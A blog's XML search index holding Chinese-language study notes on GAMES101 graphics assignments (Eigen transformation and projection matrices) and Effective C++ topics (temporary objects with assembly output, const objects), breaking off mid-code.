<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Games101</title>
    <link href="/2023/09/25/games101/"/>
    <url>/2023/09/25/games101/</url>
    
    <content type="html"><![CDATA[<h2 id="assignment-0">Assignment 0</h2><p>给定一个点 P = (2，1)，将该点绕原点先逆时针旋转 45◦ ，再平移(1，2)，计算出变换后点的坐标（要求用齐次坐标进行计算）。</p><p>仿射变换 - 三维点 (2, 1, 0)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// Eigen库的api</span><br><span class="hljs-comment">// 确定矩阵的维度即可读入matrix</span><br>Eigen :: Matrix3f i,j;<br>i &lt;&lt; <span class="hljs-number">1.0</span> , <span class="hljs-number">2.0</span> , <span class="hljs-number">3.0</span>, <br>     <span class="hljs-number">4.0</span>, <span class="hljs-number">5.0</span>, <span class="hljs-number">6.0</span>;<br><br><span class="hljs-comment">// 运算 运算符重载代表直接的运算。</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cmath&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;eigen3/Eigen/Core&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;eigen3/Eigen/Dense&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br> <br><span class="hljs-function">Eigen::Matrix3f <span class="hljs-title">Rotate_matrix</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">float</span> degree)</span> </span>&#123;<br>    Eigen::Matrix3f v;<br>    <span class="hljs-type">float</span> radian = degree * (<span class="hljs-type">float</span>)M_PI / <span class="hljs-number">180.0f</span>;<br>    v &lt;&lt; std::<span class="hljs-built_in">cos</span>(radian), -std::<span class="hljs-built_in">sin</span>(radian), <span class="hljs-number">0</span>,<br>        std::<span class="hljs-built_in">sin</span>(radian), std::<span class="hljs-built_in">cos</span>(radian), <span class="hljs-number">0</span>,<br>        <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> v; <br>&#125;<br><br><span class="hljs-function">Eigen::Matrix3f <span class="hljs-title">shift_matrix</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">float</span> x, <span class="hljs-type">const</span> <span class="hljs-type">float</span> y)</span> </span>&#123;<br>    Eigen::Matrix3f v;<br>    v &lt;&lt; <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, x,<br>        <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, y,<br>        <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> v; <br>&#125;<br><br><span class="hljs-function">Eigen::Vector3f <span class="hljs-title">x</span><span class="hljs-params">(a, b, <span class="hljs-number">0</span>)</span>, y</span>;<br>Eigen::Matrix3f v0 = <span class="hljs-built_in">Rotate_matrix</span>(<span class="hljs-number">45</span>);<br>Eigen::Matrix3f v1 = <span class="hljs-built_in">shift_matrix</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>);<br><span class="hljs-comment">// 矩阵乘法</span><br>y = v1 * v0 * x;<br>std::cout &lt;&lt; y &lt;&lt; std::endl;<br><br><span class="hljs-comment">// -0.707107 2.12132 0</span><br></code></pre></td></tr></table></figure><h2 id="assignment-1">Assignment 1</h2><p>假定了在z轴向内看，不需要额外调整视角，只需要调整观测的位置，默认的正交变换的长方体的中心已经位于原点上。</p><p>正交变换只需要将长方体内的所有点都伸缩到标准立方体上，剩余的像素点选择使用Z-buffer，不需要处理。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;Triangle.hpp&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;rasterizer.hpp&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;eigen3/Eigen/Eigen&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;opencv2/opencv.hpp&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cmath&gt;</span></span><br><br><span class="hljs-keyword">constexpr</span> <span class="hljs-type">double</span> MY_PI = <span class="hljs-number">3.1415926</span>;<br><br><br><span class="hljs-function">Eigen::Matrix4f <span class="hljs-title">get_view_matrix</span><span class="hljs-params">(Eigen::Vector3f eye_pos)</span></span><br><span class="hljs-function"></span>&#123;<br>    Eigen::Matrix4f view = Eigen::Matrix4f::<span class="hljs-built_in">Identity</span>();<br><br>    Eigen::Matrix4f translate;<br>    <span class="hljs-comment">// 视角平移到原点</span><br>    translate &lt;&lt; <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, -eye_pos[<span class="hljs-number">0</span>],<br>                 <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, -eye_pos[<span class="hljs-number">1</span>], <br>                 <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, -eye_pos[<span class="hljs-number">2</span>], <br>                 <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>;<br><br>    view = translate * view;<br><br>    <span class="hljs-keyword">return</span> view;<br>&#125;<br><br><span class="hljs-function">Eigen::Matrix4f <span class="hljs-title">get_model_matrix</span><span class="hljs-params">(<span class="hljs-type">float</span> rotation_angle)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// 只考虑使得物体沿z轴旋转的视角变换</span><br>    Eigen::Matrix4f model = Eigen::Matrix4f::<span class="hljs-built_in">Identity</span>();<br><br>    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Implement this function</span><br>    <span class="hljs-comment">// Create the model matrix for rotating the triangle around the Z axis.</span><br>    <span class="hljs-comment">// Then return it.</span><br><br>    <span class="hljs-comment">// 绕z轴 z不变 （x, y, z, 1)</span><br>    Eigen::Matrix4f rotate;<br>    <span class="hljs-comment">// 注意 angle -&gt; radian</span><br>    <span class="hljs-type">float</span> rotation_radian = rotation_angle * MY_PI / <span class="hljs-number">180.0f</span>;<br>    rotate &lt;&lt; std::<span class="hljs-built_in">cos</span>(rotation_radian), -std::<span class="hljs-built_in">sin</span>(rotation_radian), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>                              std::<span class="hljs-built_in">sin</span>(rotation_radian), std::<span class="hljs-built_in">cos</span>(rotation_radian), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>                              <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>,<br>                              <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>;<br><br>    model = rotate * model;<br><br>    <span class="hljs-keyword">return</span> model;<br>&#125;<br><br><span class="hljs-function">Eigen::Matrix4f <span class="hljs-title">get_projection_matrix</span><span class="hljs-params">(<span class="hljs-type">float</span> eye_fov, <span class="hljs-type">float</span> aspect_ratio,</span></span><br><span class="hljs-params"><span class="hljs-function">                                      <span class="hljs-type">float</span> zNear, <span class="hljs-type">float</span> zFar)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// Students will implement this function</span><br><br>    Eigen::Matrix4f projection = Eigen::Matrix4f::<span class="hljs-built_in">Identity</span>();<br><br>    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Implement this function</span><br>    <span class="hljs-comment">// Create the projection matrix for the given parameters.</span><br>    <span class="hljs-comment">// Then return it.</span><br><br>    <span class="hljs-comment">// M_正交 * M_project</span><br><br>    Eigen::Matrix4f projToOrth, orth;<br>    projToOrth &lt;&lt; -zNear, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>                  <span class="hljs-number">0</span>, -zNear, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>                  <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, -zNear - zFar, -zNear * zFar, <br>                  <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-type">float</span> t = std::<span class="hljs-built_in">tan</span>(eye_fov/<span class="hljs-number">2</span>) * std::<span class="hljs-built_in">abs</span>(zNear);<br>    <span class="hljs-type">float</span> r = aspect_ratio * t;<br>    orth &lt;&lt; <span class="hljs-number">1</span> / r, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <br>            <span class="hljs-number">0</span>, <span class="hljs-number">1</span> / t, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span> / (zFar - zNear), <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>;<br><br>    projection =  projection * orth * projToOrth;<br><br>    <span class="hljs-keyword">return</span> projection;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span>** argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">float</span> angle = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">bool</span> command_line = <span class="hljs-literal">false</span>;<br>    std::string filename = <span class="hljs-string">&quot;output.png&quot;</span>;<br><br>    <span class="hljs-keyword">if</span> (argc &gt;= <span class="hljs-number">3</span>) &#123;<br>        command_line = <span class="hljs-literal">true</span>;<br>        angle = std::<span class="hljs-built_in">stof</span>(argv[<span class="hljs-number">2</span>]); <span class="hljs-comment">// -r by default</span><br>        <span class="hljs-keyword">if</span> (argc == <span class="hljs-number">4</span>) &#123;<br>            filename = std::<span class="hljs-built_in">string</span>(argv[<span class="hljs-number">3</span>]);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function">rst::rasterizer <span class="hljs-title">r</span><span class="hljs-params">(<span class="hljs-number">700</span>, <span class="hljs-number">700</span>)</span></span>;<br><br>    Eigen::Vector3f eye_pos = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>&#125;;<br><br>    std::vector&lt;Eigen::Vector3f&gt; pos&#123;&#123;<span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">-2</span>&#125;, &#123;<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">-2</span>&#125;, &#123;<span class="hljs-number">-2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">-2</span>&#125;&#125;;<br><br>    std::vector&lt;Eigen::Vector3i&gt; ind&#123;&#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;&#125;;<br><br>    <span class="hljs-keyword">auto</span> pos_id = r.<span class="hljs-built_in">load_positions</span>(pos);<br>    <span class="hljs-keyword">auto</span> ind_id = r.<span class="hljs-built_in">load_indices</span>(ind);<br><br>    <span class="hljs-type">int</span> key = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> frame_count = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (command_line) &#123;<br>        r.<span class="hljs-built_in">clear</span>(rst::Buffers::Color | rst::Buffers::Depth);<br><span class="hljs-comment">// pipeline </span><br>        r.<span class="hljs-built_in">set_model</span>(<span class="hljs-built_in">get_model_matrix</span>(angle));<br>        r.<span class="hljs-built_in">set_view</span>(<span class="hljs-built_in">get_view_matrix</span>(eye_pos));<br>        r.<span class="hljs-built_in">set_projection</span>(<span class="hljs-built_in">get_projection_matrix</span>(<span class="hljs-number">45</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0.1</span>, <span class="hljs-number">50</span>));<br><br>        r.<span class="hljs-built_in">draw</span>(pos_id, ind_id, rst::Primitive::Triangle);<br>        <span class="hljs-function">cv::Mat <span class="hljs-title">image</span><span class="hljs-params">(<span class="hljs-number">700</span>, <span class="hljs-number">700</span>, CV_32FC3, r.frame_buffer().data())</span></span>;<br>        image.<span class="hljs-built_in">convertTo</span>(image, CV_8UC3, <span class="hljs-number">1.0f</span>);<br><br>        cv::<span class="hljs-built_in">imwrite</span>(filename, image);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (key != <span class="hljs-number">27</span>) &#123;<br>        r.<span class="hljs-built_in">clear</span>(rst::Buffers::Color | rst::Buffers::Depth);<br><br>        r.<span class="hljs-built_in">set_model</span>(<span class="hljs-built_in">get_model_matrix</span>(angle));<br>        r.<span class="hljs-built_in">set_view</span>(<span class="hljs-built_in">get_view_matrix</span>(eye_pos));<br>        r.<span class="hljs-built_in">set_projection</span>(<span class="hljs-built_in">get_projection_matrix</span>(<span class="hljs-number">45</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0.1</span>, <span class="hljs-number">50</span>));<br><br>        r.<span class="hljs-built_in">draw</span>(pos_id, ind_id, rst::Primitive::Triangle);<br><br>        <span class="hljs-function">cv::Mat <span class="hljs-title">image</span><span class="hljs-params">(<span class="hljs-number">700</span>, <span class="hljs-number">700</span>, CV_32FC3, r.frame_buffer().data())</span></span>;<br>        image.<span class="hljs-built_in">convertTo</span>(image, CV_8UC3, <span class="hljs-number">1.0f</span>);<br>        cv::<span class="hljs-built_in">imshow</span>(<span class="hljs-string">&quot;image&quot;</span>, image);<br>        key = cv::<span class="hljs-built_in">waitKey</span>(<span class="hljs-number">10</span>);<br><br>        std::cout &lt;&lt; <span class="hljs-string">&quot;frame count: &quot;</span> &lt;&lt; frame_count++ &lt;&lt; <span class="hljs-string">&#x27;\n&#x27;</span>;<br><br>        <span class="hljs-keyword">if</span> (key == <span class="hljs-string">&#x27;a&#x27;</span>) &#123;<br>            angle += <span class="hljs-number">10</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (key == <span class="hljs-string">&#x27;d&#x27;</span>) &#123;<br>            angle -= <span class="hljs-number">10</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="assignment-2">Assignment 2</h3>]]></content>
    
    
    
    <tags>
      
      <tag>Game</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Effective C++</title>
    <link href="/2023/09/19/Cpp/"/>
    <url>/2023/09/19/Cpp/</url>
    
    <content type="html"><![CDATA[<h2 id="temporary-object">Temporary Object</h2><p>运算符重载后，不改变运算的顺序</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span> &#123;<br>    <span class="hljs-keyword">public</span>:<br>        <span class="hljs-type">int</span> a;<br>    <span class="hljs-comment">// 增加一些复杂的结构</span><br>        vector&lt;string&gt; b;<br>        string c;<br>    <span class="hljs-built_in">Node</span>() &#123;&#125;<br>    <span class="hljs-built_in">Node</span>(<span class="hljs-type">int</span> a): <span class="hljs-built_in">a</span>(a) &#123;&#125;<br>&#125;;<br><br>Node <span class="hljs-keyword">operator</span>+(<span class="hljs-type">const</span> Node &amp;a, <span class="hljs-type">const</span> Node &amp;b) &#123;<br>    Node c;<br>    c.a = a.a + b.a;<br>    <span class="hljs-comment">// cout &lt;&lt; &quot;Execute :&quot;;</span><br>    <span class="hljs-keyword">return</span> c;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    Node a, b, c, d, e;<br>    a.a = <span class="hljs-number">1</span>;<br>    b.a = <span class="hljs-number">2</span>;<br>    c.a = <span class="hljs-number">3</span>;<br>    d.a = <span class="hljs-number">4</span>;<br>    <span class="hljs-comment">// (a + b) -&gt; a.operator+(b)</span><br>    <span class="hljs-comment">// 根据运算的顺序 从后往前，并没有递归 编译器处理了这个过程</span><br>    e = a + (b + (c + d));<br>&#125;<br></code></pre></td></tr></table></figure><p>汇编代码分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs assembly">// g++ -g b.cpp <br>// layout split, s si n ni<br><br>// g++ -O0 -S b.cpp<br><br>// main<br>// 存储Node数据<br>main:<br>    movl$1, -528(%rbp)<br>    movl$2, -464(%rbp)<br>    movl$3, -400(%rbp)<br>    movl$4, -336(%rbp)<br>    <br>    leaq-208(%rbp), %rax<br>    leaq-336(%rbp), %rdx<br>    leaq-400(%rbp), %rcx<br>    movq%rcx, %rsi<br>    // 第一个参数用来存储 temporary object在当前main函数（而不是重载后的add函数）<br>    movq%rax, %rdi<br>    // 调用重载<br>    call_ZplRK4NodeS1_<br>    leaq-144(%rbp), %rax<br>    leaq-208(%rbp), %rdx<br>    leaq-464(%rbp), %rcx<br>    movq%rcx, %rsi<br>    movq%rax, %rdi<br>    call_ZplRK4NodeS1_<br><br>_ZplRK4NodeS1_:<br>movq%rdi, -8(%rbp)<br>movq-8(%rbp), %rax<br>movq%rax, %rdi<br>// 在对应地址创建node<br>call_ZN4NodeC1Ev<br>// 运算结果<br>addl%eax, %edx<br><br>// 把结果存入对应的位置<br>movq-8(%rbp), %rax<br>movl%edx, (%rax)<br><br></code></pre></td></tr></table></figure><p>实际上等价于栈中的变量，可能在表达式结束后被覆盖</p><p>重载运算符的返回变量一般需要加 const，因为没有实际的符号(symbol)，且函数不能通过 &amp; 调用（编译器会报错），但可以通过 const &amp;调用。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++">Node <span class="hljs-keyword">operator</span>+(<span class="hljs-type">const</span> Node &amp;a, Node &amp;b) &#123;<br>    Node c;<br>    c.a = a.a + b.a;<br>    <span class="hljs-comment">// cout &lt;&lt; &quot;Execute :&quot;;</span><br>    <span class="hljs-keyword">return</span> c;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    Node a, b, c, d, e;<br>    a.a = <span class="hljs-number">1</span>;<br>    b.a = <span class="hljs-number">2</span>;<br>    c.a = <span class="hljs-number">3</span>;<br>    d.a = <span class="hljs-number">4</span>;<br><span class="hljs-comment">// Invalid operands to binary expression (&#x27;Node&#x27; and &#x27;Node&#x27;) (clangtypecheck_invalid_operands) </span><br>    e = a + (b + (c + d));<br>&#125;<br><br><span class="hljs-comment">// 返回是局部变量的引用, 并不是temporary object，且不同于指针，是调用函数栈的指针。</span><br>Node&amp; <span class="hljs-keyword">operator</span>+(<span class="hljs-type">const</span> Node &amp;a, <span class="hljs-type">const</span> Node &amp;b) &#123;<br>    Node c;<br>    c.a = a.a + b.a;<br>    <span class="hljs-comment">// cout &lt;&lt; &quot;Execute :&quot;;</span><br>    <span class="hljs-keyword">return</span> c;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="const-object">Const Object</h2><p>借助const的操作符重载可以提供const对象的接口</p><p>bitwise constness 不可改变对象内任何non-static对象(可借助指针绕过编译器，不会有二进制级别的检测，消耗过大)</p><p>logical constness 可借助mutable。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base</span> &#123;<br><span class="hljs-keyword">private</span>:<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">char</span>* a;<br>    vector&lt;string&gt; b;<br>    string c;<br>    <span class="hljs-built_in">Base</span>()&#123;<br>        b.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&quot;abc&quot;</span>);<br>        a = (<span class="hljs-type">char</span> *) <span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">char</span>) * <span class="hljs-number">6</span>);<br>        <span class="hljs-built_in">strcpy</span>(a, <span class="hljs-string">&quot;123&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// const 成员函数</span><br>    <span class="hljs-type">const</span> string&amp; <span class="hljs-keyword">operator</span>[] (<span class="hljs-type">size_t</span> pos) <span class="hljs-type">const</span> &#123;<br>        <span class="hljs-keyword">return</span> b[pos];<br>    &#125;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">const</span> Base a = <span class="hljs-built_in">Base</span>();<br>    <span class="hljs-comment">// 确保了 *v 的值不会被改变</span><br>    <span class="hljs-comment">// 